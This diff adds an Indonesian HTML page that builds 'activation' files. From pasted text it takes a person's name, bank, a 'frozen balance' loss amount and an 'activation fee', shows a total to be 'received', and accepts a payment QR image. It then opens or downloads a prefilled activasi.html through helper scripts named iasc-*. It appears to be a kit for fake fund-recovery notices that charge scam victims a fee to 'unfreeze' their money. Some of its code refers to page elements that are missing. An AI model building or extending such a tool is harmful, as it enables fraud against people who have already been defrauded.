@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Buat File Aktivasi</title>
+<style>
+body{
+    margin:0;
+    background:#f4f6f9;
+    font-family:Arial,Helvetica,sans-serif;
+}
+.wrap{
+    max-width:720px;
+    margin:30px auto;
+    padding:0 15px;
+    box-sizing:border-box;
+}
+h2{ margin-top:0; }
+p{ color:#555; line-height:1.5; }
+textarea{
+    width:100%;
+    height:360px;
+    resize:vertical;
+    padding:15px;
+    font-size:15px;
+    border-radius:8px;
+    border:1px solid #ccc;
+    box-sizing:border-box;
+}
+button{
+    margin-top:12px;
+    width:100%;
+    padding:15px;
+    border:none;
+    color:#fff;
+    font-size:17px;
+    border-radius:8px;
+    cursor:pointer;
+}
+.btn-open{ background:#007bff; }
+.btn-open:hover{ background:#0056b3; }
+.btn-dl{ background:#28a745; }
+.btn-dl:hover{ background:#1e7e34; }
+.preview{
+    margin-top:15px;
+    padding:12px;
+    background:#fff;
+    border:1px solid #ddd;
+    border-radius:8px;
+    font-size:14px;
+    line-height:1.6;
+}
+.preview b{ color:#007bff; }
+.qr-upload{
+    display:block;
+    margin-top:12px;
+    padding:12px;
+    background:#fff;
+    border:1px dashed #ccc;
+    border-radius:8px;
+    font-size:14px;
+}
+.qr-upload input{
+    display:block;
+    margin-top:8px;
+    width:100%;
+}
+.note{
+    margin-top:15px;
+    padding:12px;
+    background:#e8f4fd;
+    border:1px solid #b8daff;
+    border-radius:8px;
+    font-size:14px;
+    color:#004085;
+}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+<h2>Isi Aktivasi Data</h2>
+
+<textarea id="input">
+</textarea>
+
+<div id="preview" class="preview" hidden></div>
+
+<button class="btn-open" onclick="bukaActivasi()">Buka activasi.html (data terisi)</button>
+
+</div>
+
+<script src="iasc-data.js"></script>
+<script src="iasc-build.js"></script>
+<script>
+var qrBase64 = "";
+
+document.getElementById("qr-file").addEventListener("change", function (e) {
+    qrBase64 = "";
+    var file = e.target.files && e.target.files[0];
+    if (!file) return;
+    var reader = new FileReader();
+    reader.onload = function (ev) { qrBase64 = ev.target.result; };
+    reader.readAsDataURL(file);
+});
+
+document.getElementById("input").addEventListener("input", tampilkanPreview);
+tampilkanPreview();
+
+function ambilDataParsed() {
+    var text = document.getElementById("input").value;
+    var d = iascParseText(text);
+    if (!d) return null;
+    d.qrBase64 = qrBase64;
+    return d;
+}
+
+function tampilkanPreview() {
+    var el = document.getElementById("preview");
+    var d = ambilDataParsed();
+    if (!d) {
+        el.hidden = true;
+        return;
+    }
+    var total = d.kerugian + d.aktivasi;
+    el.hidden = false;
+    el.innerHTML =
+        "<b>Nama:</b> " + d.nama + "<br>" +
+        "<b>Bank:</b> " + d.bank + "<br>" +
+        "<b>Saldo dibekukan:</b> Rp" + iascFormatNum(d.kerugian) + ",-<br>" +
+        "<b>Biaya aktivasi:</b> Rp" + iascFormatNum(d.aktivasi) + ",-<br>" +
+        "<b>Total diterima:</b> Rp" + iascFormatNum(total) + ",-";
+}
+
+function siapkanPayload() {
+    var d = ambilDataParsed();
+    if (!d) {
+        alert("Data belum lengkap. Pastikan ada nama, bank, dan total kerugian.");
+        return null;
+    }
+    return iascToActivasiPayload(d, d.qrBase64 || "QR.png");
+}
+
+function bukaActivasi() {
+    var payload = siapkanPayload();
+    if (!payload) return;
+    iascSaveActivasiPrefill(payload);
+    window.open("activasi.html", "_blank");
+}
+
+async function downloadActivasi() {
+    var payload = siapkanPayload();
+    if (!payload) return;
+    await iascDownloadActivasiHtml(payload);
+}
+</script>
+
+</body>
+</html>
